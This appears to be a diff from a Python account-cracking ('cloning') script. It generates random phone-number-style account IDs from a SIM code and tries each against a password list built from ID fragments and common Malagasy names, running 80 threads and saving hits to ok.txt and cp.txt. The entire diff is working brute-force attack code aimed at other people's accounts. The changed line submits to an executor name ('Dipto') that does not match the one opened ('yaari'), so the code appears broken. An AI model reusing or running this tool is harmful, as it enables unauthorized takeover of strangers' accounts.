@@ -128,19 +128,19 @@ def num():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
+    with ThreadPool(max_workers=80) as yaari:
         os.system('clear')
         print(logo)
-        tl = str(len(user))
-        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
-        print(' \033[1;97m[+] Process has been started')
-        print(' \033[1;97m[!] Wait for ids ')
-        print(' \033[1;97m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        for guru in user:
-            uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
-            yaari.submit(rcrack1,uid,pwx,tl)
+        tl=str(len(user))
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' CLONING EN COURS ... ')
+        linex()
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],ids[:3],'aina', 'Aina', 'baholy', 'Baholy', 'bakoly', 'Bakoly', 'beloha', 'Beloha', 'fanilo', 'Fanilo', 'amboara', 'Amboara', 'miangaly', 'Miangaly','miangola','Miangola','sahondra','Sahondra','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','avotra','Avotra','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','mandresy','Mandresy','andriatsitohaina','Andriatsitohaina','sarobidy','Sarobidy','lalaina','Lafatra','lalatiana','Lalatiana','lalaina','Lalaina','kanto','Kanto']
+            Dipto.submit(method_crack,ids,passlist)
+            
     print(' [+] Crack process has been completed')
     print(' [+] Ids saved in ok.txt,cp.txt')
 
